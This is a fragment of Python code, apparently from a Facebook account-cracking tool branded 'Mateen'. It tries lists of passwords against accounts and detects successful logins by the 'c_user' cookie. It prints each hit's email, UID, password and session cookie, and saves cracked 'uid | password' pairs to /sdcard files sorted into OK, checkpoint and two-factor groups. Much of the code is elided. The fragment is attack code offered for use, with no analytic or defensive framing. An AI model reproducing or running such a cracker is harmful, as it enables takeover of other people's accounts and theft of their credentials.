    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[√]---------------------[MR-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')

                cek_apk(session,coki)

                open('/sdcard/Mateen-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r{Red}[×]--------------------[Mateen-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')

                open('/sdcard/Mateen-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/Mateen-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[Mateen] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
